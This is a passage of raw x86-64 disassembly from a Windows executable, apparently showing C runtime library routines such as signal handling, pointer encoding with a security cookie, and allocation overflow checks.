   140008924:	4c 8d 0d 85 7e 00 00 	lea    0x7e85(%rip),%r9        # 0x1400107b0
   14000892b:	b9 05 00 00 00       	mov    $0x5,%ecx
   140008930:	4c 8d 05 71 7e 00 00 	lea    0x7e71(%rip),%r8        # 0x1400107a8
   140008937:	48 8d 15 6a 68 00 00 	lea    0x686a(%rip),%rdx        # 0x14000f1a8
   14000893e:	e8 09 fc ff ff       	call   0x14000854c
   140008943:	8b cb                	mov    %ebx,%ecx
   140008945:	48 85 c0             	test   %rax,%rax
   140008948:	74 0c                	je     0x140008956
   14000894a:	48 83 c4 20          	add    $0x20,%rsp
   14000894e:	5b                   	pop    %rbx
   14000894f:	48 ff 25 e2 58 00 00 	rex.W jmp *0x58e2(%rip)        # 0x14000e238
   140008956:	48 83 c4 20          	add    $0x20,%rsp
   14000895a:	5b                   	pop    %rbx
   14000895b:	48 ff 25 6e 57 00 00 	rex.W jmp *0x576e(%rip)        # 0x14000e0d0
   140008962:	cc                   	int3
   140008963:	cc                   	int3
   140008964:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008969:	57                   	push   %rdi
   14000896a:	48 83 ec 20          	sub    $0x20,%rsp
   14000896e:	48 8b da             	mov    %rdx,%rbx
   140008971:	4c 8d 0d 40 7e 00 00 	lea    0x7e40(%rip),%r9        # 0x1400107b8
   140008978:	8b f9                	mov    %ecx,%edi
   14000897a:	48 8d 15 3f 68 00 00 	lea    0x683f(%rip),%rdx        # 0x14000f1c0
   140008981:	b9 06 00 00 00       	mov    $0x6,%ecx
   140008986:	4c 8d 05 23 7e 00 00 	lea    0x7e23(%rip),%r8        # 0x1400107b0
   14000898d:	e8 ba fb ff ff       	call   0x14000854c
   140008992:	48 8b d3             	mov    %rbx,%rdx
   140008995:	8b cf                	mov    %edi,%ecx
   140008997:	48 85 c0             	test   %rax,%rax
   14000899a:	74 08                	je     0x1400089a4
   14000899c:	ff 15 96 58 00 00    	call   *0x5896(%rip)        # 0x14000e238
   1400089a2:	eb 06                	jmp    0x1400089aa
   1400089a4:	ff 15 2e 57 00 00    	call   *0x572e(%rip)        # 0x14000e0d8
   1400089aa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400089af:	48 83 c4 20          	add    $0x20,%rsp
   1400089b3:	5f                   	pop    %rdi
   1400089b4:	c3                   	ret
   1400089b5:	cc                   	int3
   1400089b6:	cc                   	int3
   1400089b7:	cc                   	int3
   1400089b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400089bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400089c2:	57                   	push   %rdi
   1400089c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400089c7:	41 8b f0             	mov    %r8d,%esi
   1400089ca:	4c 8d 0d ef 7d 00 00 	lea    0x7def(%rip),%r9        # 0x1400107c0
   1400089d1:	8b da                	mov    %edx,%ebx
   1400089d3:	4c 8d 05 de 7d 00 00 	lea    0x7dde(%rip),%r8        # 0x1400107b8
   1400089da:	48 8b f9             	mov    %rcx,%rdi
   1400089dd:	48 8d 15 f4 67 00 00 	lea    0x67f4(%rip),%rdx        # 0x14000f1d8
   1400089e4:	b9 12 00 00 00       	mov    $0x12,%ecx
   1400089e9:	e8 5e fb ff ff       	call   0x14000854c
   1400089ee:	8b d3                	mov    %ebx,%edx
   1400089f0:	48 8b cf             	mov    %rdi,%rcx
   1400089f3:	48 85 c0             	test   %rax,%rax
   1400089f6:	74 0b                	je     0x140008a03
   1400089f8:	44 8b c6             	mov    %esi,%r8d
   1400089fb:	ff 15 37 58 00 00    	call   *0x5837(%rip)        # 0x14000e238
   140008a01:	eb 06                	jmp    0x140008a09
   140008a03:	ff 15 b7 56 00 00    	call   *0x56b7(%rip)        # 0x14000e0c0
   140008a09:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008a0e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008a13:	48 83 c4 20          	add    $0x20,%rsp
   140008a17:	5f                   	pop    %rdi
   140008a18:	c3                   	ret
   140008a19:	cc                   	int3
   140008a1a:	cc                   	int3
   140008a1b:	cc                   	int3
   140008a1c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008a21:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008a26:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008a2b:	57                   	push   %rdi
   140008a2c:	48 83 ec 50          	sub    $0x50,%rsp
   140008a30:	41 8b d9             	mov    %r9d,%ebx
   140008a33:	49 8b f8             	mov    %r8,%rdi
   140008a36:	8b f2                	mov    %edx,%esi
   140008a38:	4c 8d 0d 89 7d 00 00 	lea    0x7d89(%rip),%r9        # 0x1400107c8
   140008a3f:	48 8b e9             	mov    %rcx,%rbp
   140008a42:	4c 8d 05 77 7d 00 00 	lea    0x7d77(%rip),%r8        # 0x1400107c0
   140008a49:	48 8d 15 78 7d 00 00 	lea    0x7d78(%rip),%rdx        # 0x1400107c8
   140008a50:	b9 14 00 00 00       	mov    $0x14,%ecx
   140008a55:	e8 f2 fa ff ff       	call   0x14000854c
   140008a5a:	48 85 c0             	test   %rax,%rax
   140008a5d:	74 52                	je     0x140008ab1
   140008a5f:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   140008a66:	00 
   140008a67:	44 8b cb             	mov    %ebx,%r9d
   140008a6a:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140008a71:	00 
   140008a72:	8b d6                	mov    %esi,%edx
   140008a74:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   140008a79:	4c 8b c7             	mov    %rdi,%r8
   140008a7c:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140008a81:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140008a88:	00 
   140008a89:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008a8e:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140008a95:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140008a99:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140008aa0:	00 
   140008aa1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008aa6:	48 8b cd             	mov    %rbp,%rcx
   140008aa9:	ff 15 89 57 00 00    	call   *0x5789(%rip)        # 0x14000e238
   140008aaf:	eb 32                	jmp    0x140008ae3
   140008ab1:	33 d2                	xor    %edx,%edx
   140008ab3:	48 8b cd             	mov    %rbp,%rcx
   140008ab6:	e8 3d 00 00 00       	call   0x140008af8
   140008abb:	8b c8                	mov    %eax,%ecx
   140008abd:	44 8b cb             	mov    %ebx,%r9d
   140008ac0:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140008ac7:	4c 8b c7             	mov    %rdi,%r8
   140008aca:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008ace:	8b d6                	mov    %esi,%edx
   140008ad0:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140008ad7:	00 
   140008ad8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008add:	ff 15 ed 56 00 00    	call   *0x56ed(%rip)        # 0x14000e1d0
   140008ae3:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140008ae8:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140008aed:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140008af2:	48 83 c4 50          	add    $0x50,%rsp
   140008af6:	5f                   	pop    %rdi
   140008af7:	c3                   	ret
   140008af8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008afd:	57                   	push   %rdi
   140008afe:	48 83 ec 20          	sub    $0x20,%rsp
   140008b02:	8b fa                	mov    %edx,%edi
   140008b04:	4c 8d 0d d5 7c 00 00 	lea    0x7cd5(%rip),%r9        # 0x1400107e0
   140008b0b:	48 8b d9             	mov    %rcx,%rbx
   140008b0e:	48 8d 15 cb 7c 00 00 	lea    0x7ccb(%rip),%rdx        # 0x1400107e0
   140008b15:	b9 16 00 00 00       	mov    $0x16,%ecx
   140008b1a:	4c 8d 05 b7 7c 00 00 	lea    0x7cb7(%rip),%r8        # 0x1400107d8
   140008b21:	e8 26 fa ff ff       	call   0x14000854c
   140008b26:	48 8b cb             	mov    %rbx,%rcx
   140008b29:	48 85 c0             	test   %rax,%rax
   140008b2c:	74 0a                	je     0x140008b38
   140008b2e:	8b d7                	mov    %edi,%edx
   140008b30:	ff 15 02 57 00 00    	call   *0x5702(%rip)        # 0x14000e238
   140008b36:	eb 05                	jmp    0x140008b3d
   140008b38:	e8 1b 1c 00 00       	call   0x14000a758
   140008b3d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008b42:	48 83 c4 20          	add    $0x20,%rsp
   140008b46:	5f                   	pop    %rdi
   140008b47:	c3                   	ret
   140008b48:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140008b4d:	48 8d 3d ac f9 00 00 	lea    0xf9ac(%rip),%rdi        # 0x140018500
   140008b54:	48 8d 05 b5 fa 00 00 	lea    0xfab5(%rip),%rax        # 0x140018610
   140008b5b:	48 3b c7             	cmp    %rdi,%rax
   140008b5e:	48 8b 05 c3 e4 00 00 	mov    0xe4c3(%rip),%rax        # 0x140017028
   140008b65:	48 1b c9             	sbb    %rcx,%rcx
   140008b68:	48 f7 d1             	not    %rcx
   140008b6b:	83 e1 22             	and    $0x22,%ecx
   140008b6e:	f3 48 ab             	rep stos %rax,(%rdi)
   140008b71:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140008b76:	b0 01                	mov    $0x1,%al
   140008b78:	c3                   	ret
   140008b79:	cc                   	int3
   140008b7a:	cc                   	int3
   140008b7b:	cc                   	int3
   140008b7c:	40 53                	rex push %rbx
   140008b7e:	48 83 ec 20          	sub    $0x20,%rsp
   140008b82:	84 c9                	test   %cl,%cl
   140008b84:	75 2f                	jne    0x140008bb5
   140008b86:	48 8d 1d d3 f8 00 00 	lea    0xf8d3(%rip),%rbx        # 0x140018460
   140008b8d:	48 8b 0b             	mov    (%rbx),%rcx
   140008b90:	48 85 c9             	test   %rcx,%rcx
   140008b93:	74 10                	je     0x140008ba5
   140008b95:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140008b99:	74 06                	je     0x140008ba1
   140008b9b:	ff 15 47 55 00 00    	call   *0x5547(%rip)        # 0x14000e0e8
   140008ba1:	48 83 23 00          	andq   $0x0,(%rbx)
   140008ba5:	48 83 c3 08          	add    $0x8,%rbx
   140008ba9:	48 8d 05 50 f9 00 00 	lea    0xf950(%rip),%rax        # 0x140018500
   140008bb0:	48 3b d8             	cmp    %rax,%rbx
   140008bb3:	75 d8                	jne    0x140008b8d
   140008bb5:	b0 01                	mov    $0x1,%al
   140008bb7:	48 83 c4 20          	add    $0x20,%rsp
   140008bbb:	5b                   	pop    %rbx
   140008bbc:	c3                   	ret
   140008bbd:	cc                   	int3
   140008bbe:	cc                   	int3
   140008bbf:	cc                   	int3
   140008bc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008bc5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008bca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008bcf:	57                   	push   %rdi
   140008bd0:	48 83 ec 20          	sub    $0x20,%rsp
   140008bd4:	49 8b e8             	mov    %r8,%rbp
   140008bd7:	48 8b da             	mov    %rdx,%rbx
   140008bda:	48 8b f1             	mov    %rcx,%rsi
   140008bdd:	48 85 d2             	test   %rdx,%rdx
   140008be0:	74 1d                	je     0x140008bff
   140008be2:	33 d2                	xor    %edx,%edx
   140008be4:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140008be8:	48 f7 f3             	div    %rbx
   140008beb:	49 3b c0             	cmp    %r8,%rax
   140008bee:	73 0f                	jae    0x140008bff
   140008bf0:	e8 cb cb ff ff       	call   0x1400057c0
   140008bf5:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140008bfb:	33 c0                	xor    %eax,%eax
   140008bfd:	eb 41                	jmp    0x140008c40
   140008bff:	48 85 f6             	test   %rsi,%rsi
   140008c02:	74 0a                	je     0x140008c0e
   140008c04:	e8 ff 1b 00 00       	call   0x14000a808
   140008c09:	48 8b f8             	mov    %rax,%rdi
   140008c0c:	eb 02                	jmp    0x140008c10
   140008c0e:	33 ff                	xor    %edi,%edi
   140008c10:	48 0f af dd          	imul   %rbp,%rbx
   140008c14:	48 8b ce             	mov    %rsi,%rcx
   140008c17:	48 8b d3             	mov    %rbx,%rdx
   140008c1a:	e8 25 1c 00 00       	call   0x14000a844
   140008c1f:	48 8b f0             	mov    %rax,%rsi
   140008c22:	48 85 c0             	test   %rax,%rax
   140008c25:	74 16                	je     0x140008c3d
   140008c27:	48 3b fb             	cmp    %rbx,%rdi
   140008c2a:	73 11                	jae    0x140008c3d
   140008c2c:	48 2b df             	sub    %rdi,%rbx
   140008c2f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140008c33:	4c 8b c3             	mov    %rbx,%r8
   140008c36:	33 d2                	xor    %edx,%edx
   140008c38:	e8 43 9d ff ff       	call   0x140002980
   140008c3d:	48 8b c6             	mov    %rsi,%rax
   140008c40:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008c45:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008c4a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008c4f:	48 83 c4 20          	add    $0x20,%rsp
   140008c53:	5f                   	pop    %rdi
   140008c54:	c3                   	ret
   140008c55:	cc                   	int3
   140008c56:	cc                   	int3
   140008c57:	cc                   	int3
   140008c58:	48 83 ec 28          	sub    $0x28,%rsp
   140008c5c:	ff 15 76 55 00 00    	call   *0x5576(%rip)        # 0x14000e1d8
   140008c62:	48 85 c0             	test   %rax,%rax
   140008c65:	48 89 05 ac f9 00 00 	mov    %rax,0xf9ac(%rip)        # 0x140018618
   140008c6c:	0f 95 c0             	setne  %al
   140008c6f:	48 83 c4 28          	add    $0x28,%rsp
   140008c73:	c3                   	ret
   140008c74:	48 83 25 9c f9 00 00 	andq   $0x0,0xf99c(%rip)        # 0x140018618
   140008c7b:	00 
   140008c7c:	b0 01                	mov    $0x1,%al
   140008c7e:	c3                   	ret
   140008c7f:	cc                   	int3
   140008c80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008c85:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008c8a:	57                   	push   %rdi
   140008c8b:	48 83 ec 20          	sub    $0x20,%rsp
   140008c8f:	48 8b f2             	mov    %rdx,%rsi
   140008c92:	48 8b f9             	mov    %rcx,%rdi
   140008c95:	48 3b ca             	cmp    %rdx,%rcx
   140008c98:	74 54                	je     0x140008cee
   140008c9a:	48 8b d9             	mov    %rcx,%rbx
   140008c9d:	48 8b 03             	mov    (%rbx),%rax
   140008ca0:	48 85 c0             	test   %rax,%rax
   140008ca3:	74 0a                	je     0x140008caf
   140008ca5:	ff 15 8d 55 00 00    	call   *0x558d(%rip)        # 0x14000e238
   140008cab:	84 c0                	test   %al,%al
   140008cad:	74 09                	je     0x140008cb8
   140008caf:	48 83 c3 10          	add    $0x10,%rbx
   140008cb3:	48 3b de             	cmp    %rsi,%rbx
   140008cb6:	75 e5                	jne    0x140008c9d
   140008cb8:	48 3b de             	cmp    %rsi,%rbx
   140008cbb:	74 31                	je     0x140008cee
   140008cbd:	48 3b df             	cmp    %rdi,%rbx
   140008cc0:	74 28                	je     0x140008cea
   140008cc2:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   140008cc6:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   140008ccb:	74 10                	je     0x140008cdd
   140008ccd:	48 8b 03             	mov    (%rbx),%rax
   140008cd0:	48 85 c0             	test   %rax,%rax
   140008cd3:	74 08                	je     0x140008cdd
   140008cd5:	33 c9                	xor    %ecx,%ecx
   140008cd7:	ff 15 5b 55 00 00    	call   *0x555b(%rip)        # 0x14000e238
   140008cdd:	48 83 eb 10          	sub    $0x10,%rbx
   140008ce1:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140008ce5:	48 3b c7             	cmp    %rdi,%rax
   140008ce8:	75 dc                	jne    0x140008cc6
   140008cea:	32 c0                	xor    %al,%al
   140008cec:	eb 02                	jmp    0x140008cf0
   140008cee:	b0 01                	mov    $0x1,%al
   140008cf0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008cf5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008cfa:	48 83 c4 20          	add    $0x20,%rsp
   140008cfe:	5f                   	pop    %rdi
   140008cff:	c3                   	ret
   140008d00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008d05:	57                   	push   %rdi
   140008d06:	48 83 ec 20          	sub    $0x20,%rsp
   140008d0a:	48 8b da             	mov    %rdx,%rbx
   140008d0d:	48 8b f9             	mov    %rcx,%rdi
   140008d10:	48 3b ca             	cmp    %rdx,%rcx
   140008d13:	74 1a                	je     0x140008d2f
   140008d15:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140008d19:	48 85 c0             	test   %rax,%rax
   140008d1c:	74 08                	je     0x140008d26
   140008d1e:	33 c9                	xor    %ecx,%ecx
   140008d20:	ff 15 12 55 00 00    	call   *0x5512(%rip)        # 0x14000e238
   140008d26:	48 83 eb 10          	sub    $0x10,%rbx
   140008d2a:	48 3b df             	cmp    %rdi,%rbx
   140008d2d:	75 e6                	jne    0x140008d15
   140008d2f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008d34:	b0 01                	mov    $0x1,%al
   140008d36:	48 83 c4 20          	add    $0x20,%rsp
   140008d3a:	5f                   	pop    %rdi
   140008d3b:	c3                   	ret
   140008d3c:	48 89 0d dd f8 00 00 	mov    %rcx,0xf8dd(%rip)        # 0x140018620
   140008d43:	c3                   	ret
   140008d44:	40 53                	rex push %rbx
   140008d46:	48 83 ec 20          	sub    $0x20,%rsp
   140008d4a:	48 8b d9             	mov    %rcx,%rbx
   140008d4d:	e8 22 00 00 00       	call   0x140008d74
   140008d52:	48 85 c0             	test   %rax,%rax
   140008d55:	74 14                	je     0x140008d6b
   140008d57:	48 8b cb             	mov    %rbx,%rcx
   140008d5a:	ff 15 d8 54 00 00    	call   *0x54d8(%rip)        # 0x14000e238
   140008d60:	85 c0                	test   %eax,%eax
   140008d62:	74 07                	je     0x140008d6b
   140008d64:	b8 01 00 00 00       	mov    $0x1,%eax
   140008d69:	eb 02                	jmp    0x140008d6d
   140008d6b:	33 c0                	xor    %eax,%eax
   140008d6d:	48 83 c4 20          	add    $0x20,%rsp
   140008d71:	5b                   	pop    %rbx
   140008d72:	c3                   	ret
   140008d73:	cc                   	int3
   140008d74:	40 53                	rex push %rbx
   140008d76:	48 83 ec 20          	sub    $0x20,%rsp
   140008d7a:	33 c9                	xor    %ecx,%ecx
   140008d7c:	e8 63 e8 ff ff       	call   0x1400075e4
   140008d81:	90                   	nop
   140008d82:	48 8b 1d 9f e2 00 00 	mov    0xe29f(%rip),%rbx        # 0x140017028
   140008d89:	8b cb                	mov    %ebx,%ecx
   140008d8b:	83 e1 3f             	and    $0x3f,%ecx
   140008d8e:	48 33 1d 8b f8 00 00 	xor    0xf88b(%rip),%rbx        # 0x140018620
   140008d95:	48 d3 cb             	ror    %cl,%rbx
   140008d98:	33 c9                	xor    %ecx,%ecx
   140008d9a:	e8 99 e8 ff ff       	call   0x140007638
   140008d9f:	48 8b c3             	mov    %rbx,%rax
   140008da2:	48 83 c4 20          	add    $0x20,%rsp
   140008da6:	5b                   	pop    %rbx
   140008da7:	c3                   	ret
   140008da8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008dad:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008db2:	57                   	push   %rdi
   140008db3:	48 83 ec 20          	sub    $0x20,%rsp
   140008db7:	49 8b f9             	mov    %r9,%rdi
   140008dba:	8b 0a                	mov    (%rdx),%ecx
   140008dbc:	e8 23 e8 ff ff       	call   0x1400075e4
   140008dc1:	90                   	nop
   140008dc2:	48 8b 1d 5f e2 00 00 	mov    0xe25f(%rip),%rbx        # 0x140017028
   140008dc9:	8b cb                	mov    %ebx,%ecx
   140008dcb:	83 e1 3f             	and    $0x3f,%ecx
   140008dce:	48 33 1d 63 f8 00 00 	xor    0xf863(%rip),%rbx        # 0x140018638
   140008dd5:	48 d3 cb             	ror    %cl,%rbx
   140008dd8:	8b 0f                	mov    (%rdi),%ecx
   140008dda:	e8 59 e8 ff ff       	call   0x140007638
   140008ddf:	48 8b c3             	mov    %rbx,%rax
   140008de2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008de7:	48 83 c4 20          	add    $0x20,%rsp
   140008deb:	5f                   	pop    %rdi
   140008dec:	c3                   	ret
   140008ded:	cc                   	int3
   140008dee:	cc                   	int3
   140008def:	cc                   	int3
   140008df0:	4c 8b dc             	mov    %rsp,%r11
   140008df3:	48 83 ec 28          	sub    $0x28,%rsp
   140008df7:	b8 03 00 00 00       	mov    $0x3,%eax
   140008dfc:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140008e00:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140008e04:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140008e08:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140008e0c:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140008e10:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140008e14:	e8 8f ff ff ff       	call   0x140008da8
   140008e19:	48 83 c4 28          	add    $0x28,%rsp
   140008e1d:	c3                   	ret
   140008e1e:	cc                   	int3
   140008e1f:	cc                   	int3
   140008e20:	48 89 0d 01 f8 00 00 	mov    %rcx,0xf801(%rip)        # 0x140018628
   140008e27:	48 89 0d 02 f8 00 00 	mov    %rcx,0xf802(%rip)        # 0x140018630
   140008e2e:	48 89 0d 03 f8 00 00 	mov    %rcx,0xf803(%rip)        # 0x140018638
   140008e35:	48 89 0d 04 f8 00 00 	mov    %rcx,0xf804(%rip)        # 0x140018640
   140008e3c:	c3                   	ret
   140008e3d:	cc                   	int3
   140008e3e:	cc                   	int3
   140008e3f:	cc                   	int3
   140008e40:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008e45:	56                   	push   %rsi
   140008e46:	57                   	push   %rdi
   140008e47:	41 54                	push   %r12
   140008e49:	41 55                	push   %r13
   140008e4b:	41 56                	push   %r14
   140008e4d:	48 83 ec 40          	sub    $0x40,%rsp
   140008e51:	8b d9                	mov    %ecx,%ebx
   140008e53:	45 33 ed             	xor    %r13d,%r13d
   140008e56:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   140008e5b:	41 b6 01             	mov    $0x1,%r14b
   140008e5e:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140008e63:	83 f9 02             	cmp    $0x2,%ecx
   140008e66:	74 21                	je     0x140008e89
   140008e68:	83 f9 04             	cmp    $0x4,%ecx
   140008e6b:	74 4c                	je     0x140008eb9
   140008e6d:	83 f9 06             	cmp    $0x6,%ecx
   140008e70:	74 17                	je     0x140008e89
   140008e72:	83 f9 08             	cmp    $0x8,%ecx
   140008e75:	74 42                	je     0x140008eb9
   140008e77:	83 f9 0b             	cmp    $0xb,%ecx
   140008e7a:	74 3d                	je     0x140008eb9
   140008e7c:	83 f9 0f             	cmp    $0xf,%ecx
   140008e7f:	74 08                	je     0x140008e89
   140008e81:	8d 41 eb             	lea    -0x15(%rcx),%eax
   140008e84:	83 f8 01             	cmp    $0x1,%eax
   140008e87:	77 7d                	ja     0x140008f06
   140008e89:	83 e9 02             	sub    $0x2,%ecx
   140008e8c:	0f 84 af 00 00 00    	je     0x140008f41
   140008e92:	83 e9 04             	sub    $0x4,%ecx
   140008e95:	0f 84 8b 00 00 00    	je     0x140008f26
   140008e9b:	83 e9 09             	sub    $0x9,%ecx
   140008e9e:	0f 84 94 00 00 00    	je     0x140008f38
   140008ea4:	83 e9 06             	sub    $0x6,%ecx
   140008ea7:	0f 84 82 00 00 00    	je     0x140008f2f
   140008ead:	83 f9 01             	cmp    $0x1,%ecx
   140008eb0:	74 74                	je     0x140008f26
   140008eb2:	33 ff                	xor    %edi,%edi
   140008eb4:	e9 8f 00 00 00       	jmp    0x140008f48
   140008eb9:	e8 a2 c4 ff ff       	call   0x140005360
   140008ebe:	4c 8b e8             	mov    %rax,%r13
   140008ec1:	48 85 c0             	test   %rax,%rax
   140008ec4:	75 18                	jne    0x140008ede
   140008ec6:	83 c8 ff             	or     $0xffffffff,%eax
   140008ec9:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140008ed0:	00 
   140008ed1:	48 83 c4 40          	add    $0x40,%rsp
   140008ed5:	41 5e                	pop    %r14
   140008ed7:	41 5d                	pop    %r13
   140008ed9:	41 5c                	pop    %r12
   140008edb:	5f                   	pop    %rdi
   140008edc:	5e                   	pop    %rsi
   140008edd:	c3                   	ret
   140008ede:	48 8b 00             	mov    (%rax),%rax
   140008ee1:	48 8b 0d d8 63 00 00 	mov    0x63d8(%rip),%rcx        # 0x14000f2c0
   140008ee8:	48 c1 e1 04          	shl    $0x4,%rcx
   140008eec:	48 03 c8             	add    %rax,%rcx
   140008eef:	eb 09                	jmp    0x140008efa
   140008ef1:	39 58 04             	cmp    %ebx,0x4(%rax)
   140008ef4:	74 0b                	je     0x140008f01
   140008ef6:	48 83 c0 10          	add    $0x10,%rax
   140008efa:	48 3b c1             	cmp    %rcx,%rax
   140008efd:	75 f2                	jne    0x140008ef1
   140008eff:	33 c0                	xor    %eax,%eax
   140008f01:	48 85 c0             	test   %rax,%rax
   140008f04:	75 12                	jne    0x140008f18
   140008f06:	e8 b5 c8 ff ff       	call   0x1400057c0
   140008f0b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140008f11:	e8 8a c7 ff ff       	call   0x1400056a0
   140008f16:	eb ae                	jmp    0x140008ec6
   140008f18:	48 8d 78 08          	lea    0x8(%rax),%rdi
   140008f1c:	45 32 f6             	xor    %r14b,%r14b
   140008f1f:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140008f24:	eb 22                	jmp    0x140008f48
   140008f26:	48 8d 3d 0b f7 00 00 	lea    0xf70b(%rip),%rdi        # 0x140018638
   140008f2d:	eb 19                	jmp    0x140008f48
   140008f2f:	48 8d 3d fa f6 00 00 	lea    0xf6fa(%rip),%rdi        # 0x140018630
   140008f36:	eb 10                	jmp    0x140008f48
   140008f38:	48 8d 3d 01 f7 00 00 	lea    0xf701(%rip),%rdi        # 0x140018640
   140008f3f:	eb 07                	jmp    0x140008f48
   140008f41:	48 8d 3d e0 f6 00 00 	lea    0xf6e0(%rip),%rdi        # 0x140018628
   140008f48:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   140008f4f:	00 00 
   140008f51:	45 84 f6             	test   %r14b,%r14b
   140008f54:	74 0b                	je     0x140008f61
   140008f56:	b9 03 00 00 00       	mov    $0x3,%ecx
   140008f5b:	e8 84 e6 ff ff       	call   0x1400075e4
   140008f60:	90                   	nop
   140008f61:	48 8b 37             	mov    (%rdi),%rsi
   140008f64:	45 84 f6             	test   %r14b,%r14b
   140008f67:	74 12                	je     0x140008f7b
   140008f69:	48 8b 05 b8 e0 00 00 	mov    0xe0b8(%rip),%rax        # 0x140017028
   140008f70:	8b c8                	mov    %eax,%ecx
   140008f72:	83 e1 3f             	and    $0x3f,%ecx
   140008f75:	48 33 f0             	xor    %rax,%rsi
   140008f78:	48 d3 ce             	ror    %cl,%rsi
   140008f7b:	48 83 fe 01          	cmp    $0x1,%rsi
   140008f7f:	0f 84 94 00 00 00    	je     0x140009019
   140008f85:	48 85 f6             	test   %rsi,%rsi
   140008f88:	0f 84 03 01 00 00    	je     0x140009091
   140008f8e:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   140008f94:	83 fb 0b             	cmp    $0xb,%ebx
   140008f97:	77 3d                	ja     0x140008fd6
   140008f99:	41 0f a3 dc          	bt     %ebx,%r12d
   140008f9d:	73 37                	jae    0x140008fd6
   140008f9f:	49 8b 45 08          	mov    0x8(%r13),%rax
   140008fa3:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140008faa:	00 
   140008fab:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008fb0:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   140008fb5:	83 fb 08             	cmp    $0x8,%ebx
   140008fb8:	75 53                	jne    0x14000900d
   140008fba:	e8 25 c2 ff ff       	call   0x1400051e4
   140008fbf:	8b 40 10             	mov    0x10(%rax),%eax
   140008fc2:	89 44 24 78          	mov    %eax,0x78(%rsp)
   140008fc6:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140008fca:	e8 15 c2 ff ff       	call   0x1400051e4
   140008fcf:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   140008fd6:	83 fb 08             	cmp    $0x8,%ebx
   140008fd9:	75 32                	jne    0x14000900d
   140008fdb:	48 8b 05 e6 62 00 00 	mov    0x62e6(%rip),%rax        # 0x14000f2c8
   140008fe2:	48 c1 e0 04          	shl    $0x4,%rax
   140008fe6:	49 03 45 00          	add    0x0(%r13),%rax
   140008fea:	48 8b 0d df 62 00 00 	mov    0x62df(%rip),%rcx        # 0x14000f2d0
   140008ff1:	48 c1 e1 04          	shl    $0x4,%rcx
   140008ff5:	48 03 c8             	add    %rax,%rcx
   140008ff8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008ffd:	48 3b c1             	cmp    %rcx,%rax
